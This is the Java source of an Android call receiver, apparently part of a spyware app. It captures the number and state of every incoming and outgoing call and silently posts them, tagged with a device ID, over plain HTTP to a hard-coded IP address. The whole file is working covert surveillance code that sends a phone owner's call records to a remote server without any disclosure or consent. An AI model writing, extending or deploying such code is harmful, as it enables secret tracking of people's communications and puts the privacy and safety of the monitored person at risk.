package com.alzahra.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class CallReceiver extends BroadcastReceiver {
    private static final String TAG = "AlZahraCall";
    private static final String SERVER = "http://216.128.156.226:8443";
    private String lastState = "";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
                String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                sendData(context, "outgoing", number);
                return;
            }
            
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            
            if (state == null) return;
            
            if (state.equals(lastState)) return;
            lastState = state;
            
            String type = "unknown";
            if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                type = "ringing";
            } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                type = "offhook";
            } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                type = "idle";
            }
            
            sendData(context, type, number != null ? number : "");
        } catch (Exception e) {
            Log.e(TAG, "Call error", e);
        }
    }
    
    private void sendData(Context context, String type, String number) {
        new Thread(() -> {
            try {
                String deviceId = context.getSharedPreferences("alzahra_prefs", Context.MODE_PRIVATE)
                    .getString("device_id", "UNKNOWN");
                
                URL url = new URL(SERVER + "/api/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                
                JSONObject json = new JSONObject();
                json.put("device_id", deviceId);
                json.put("type", "call_" + type);
                json.put("content", "{\"number\":\"" + number + "\"}");
                json.put("time", System.currentTimeMillis());
                
                conn.getOutputStream().write(json.toString().getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Send error", e);
            }
        }).start();
    }
}
